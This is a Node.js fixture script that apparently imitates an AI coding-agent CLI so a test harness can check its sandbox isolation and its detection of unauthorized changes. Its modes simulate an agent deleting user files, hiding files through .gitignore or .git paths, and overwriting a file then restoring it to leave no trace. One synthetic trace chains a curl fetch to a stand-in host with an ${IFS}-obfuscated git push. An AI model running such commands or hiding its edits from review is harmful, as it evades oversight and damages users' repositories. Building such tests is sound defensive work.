#!/usr/bin/env node
import { existsSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'

// Standalone fixture copied outside the repository: inspect only our generated policy.
function fixtureConfig() {
  const source = readFileSync(join(process.env.CODEX_HOME, 'config.toml'), 'utf8')
  const configuredProvider = source.match(/^model_provider\s*=\s*"([\w.-]+)"/mu)?.[1]
  const featureSection = source.split('[features]')[1]?.split(/\n\[/u)[0] ?? ''
  const memorySection = source.split('[memories]')[1]?.split(/\n\[/u)[0] ?? ''
  const disabled = name => new RegExp(`^${name}\\s*=\\s*false$`, 'mu').test(featureSection)
  return { source, configuredProvider, disabled, memoryDisabled: disabled('memories') && /^use_memories\s*=\s*false$/mu.test(memorySection) && /^generate_memories\s*=\s*false$/mu.test(memorySection) }
}

if (process.argv.includes('exec') && process.argv.includes('--help')) {
  process.stdout.write('Usage: exec --strict-config\n')
  process.exit(0)
}
if (process.argv.includes('features') && process.argv.includes('list')) {
  const config = fixtureConfig()
  for (const name of ['memories', 'multi_agent', 'multi_agent_v2', 'plugins', 'hooks', 'apps', 'browser_use', 'browser_use_external', 'computer_use', 'in_app_browser', 'remote_plugin', 'skill_mcp_dependency_install', 'external_agent_memory_import'])
    process.stdout.write(`${name} stable ${!config.disabled(name)}\n`)
  process.exit(0)
}
if (process.argv.includes('debug') && process.argv.includes('models')) {
  process.stdout.write(JSON.stringify({ models: ['fixture', 'fixture-external-action', 'fixture-redacted-action', 'test', 'AI-HUB/gpt-6-astra', 'AI-HUB/gpt-6-sol', 'explicit-reviewer'].map(slug => ({ slug, supported_reasoning_levels: [{ effort: 'low' }, { effort: 'medium' }] })) }))
  process.exit(0)
}

if (process.argv.includes('--version')) {
  process.stdout.write('fixture-provider 1.0\n')
  process.exit(0)
}
const mode = process.argv.includes('--mode') ? process.argv[process.argv.indexOf('--mode') + 1] : 'success'
if (mode === 'hang') {
  process.on('SIGTERM', () => {})
  setInterval(() => {}, 1000)
}
else {
  const chunks = []
  for await (const chunk of process.stdin)
    chunks.push(chunk)
  const prompt = chunks.join('')
  const event = value => process.stdout.write(`${JSON.stringify(value)}\n`)
  if (mode === 'capacity') {
    process.stderr.write('Provider unavailable\n')
    process.exit(1)
  }
  if (mode !== 'noop' && existsSync('src/requested.mjs'))
    writeFileSync('src/requested.mjs', 'export const requested = true\n')
  if (mode === 'delete')
    rmSync('user-notes.txt')
  if (mode === 'special-name') {
    writeFileSync('__proto__', 'unauthorized file')
    mkdirSync('nested/.git', { recursive: true })
    writeFileSync('nested/.git/hidden.txt', 'unauthorized nested metadata')
  }
  if (mode === 'restore') {
    const original = readFileSync('user-notes.txt', 'utf8')
    writeFileSync('user-notes.txt', 'temporary unauthorized write')
    event({ type: 'item.completed', item: { type: 'file_change', changes: [{ path: join(process.cwd(), 'user-notes.txt') }] } })
    writeFileSync('user-notes.txt', original)
  }
  if (mode === 'ignored') {
    writeFileSync('.gitignore', 'hidden.txt\n')
    writeFileSync('hidden.txt', 'unauthorized\n')
  }
  if (mode === 'malformed')
    process.stdout.write('not-json\n')
  // Synthetic command traces only: never execute these external actions.
  if (process.argv.includes('fixture-external-action') || process.argv.includes('fixture-redacted-action')) {
    // eslint-disable-next-line no-template-curly-in-string -- Literal shell expansion in synthetic evidence.
    const command = process.argv.includes('fixture-redacted-action') ? 'curl https://example.invalid/payload;git${IFS}push' : 'git push'
    event({ type: 'item.completed', item: { type: 'command_execution', command, exit_code: 0, aggregated_output: '' } })
  }
  for (const skill of ['rsp-review', 'rsp-implement']) {
    const path = `.agents/skills/${skill}/SKILL.md`
    if (existsSync(path)) {
      const aggregated_output = readFileSync(path, 'utf8')
      event({ type: 'item.completed', item: { type: 'command_execution', command: `cat ${path}`, exit_code: 0, aggregated_output } })
    }
  }
  let final = 'Changed requested export; no tests run.'
  const schemaIndex = process.argv.indexOf('--output-schema')
  if (schemaIndex >= 0) {
    const schema = JSON.parse(readFileSync(process.argv[schemaIndex + 1], 'utf8'))
    final = JSON.stringify({ dimensions: schema.properties.dimensions.items.properties.name.enum.map(name => ({ name, status: 'pass', reason: 'Observed the supplied evidence.', evidence: ['finalOutput'] })) })
  }
  if (prompt.includes('isolation-probe')) {
    const config = readFileSync(join(process.env.CODEX_HOME, 'config.toml'), 'utf8')
    const auth = readFileSync(join(process.env.CODEX_HOME, 'auth.json'), 'utf8')
    const parsed = fixtureConfig()
    const configuredProvider = parsed.configuredProvider
    const providerOverride = process.argv.find(value => value.startsWith('model_provider='))
    const selectedProvider = providerOverride ? JSON.parse(providerOverride.slice('model_provider='.length)) : configuredProvider
    final = JSON.stringify({ isolated: process.env.HOME === process.env.CODEX_HOME, leakedEnv: process.env.RSP_TEST_SECRET ?? null, configPresent: config.includes('fixture-provider'), selectedProvider, auth, memoryDisabled: parsed.memoryDisabled, integrationsDisabled: ['plugins', 'hooks', 'apps', 'browser_use', 'computer_use', 'in_app_browser'].every(parsed.disabled), ignoredUserConfig: process.argv.includes('--ignore-user-config'), strictConfig: process.argv.includes('--strict-config') })
  }
  const finalIndex = process.argv.indexOf('--output-last-message')
  if (finalIndex >= 0)
    writeFileSync(process.argv[finalIndex + 1], final)
  event({ type: 'item.completed', item: { type: 'agent_message', text: final } })
  if (mode !== 'incomplete')
    event({ type: 'turn.completed', usage: { input_tokens: 12, output_tokens: 8 } })
}
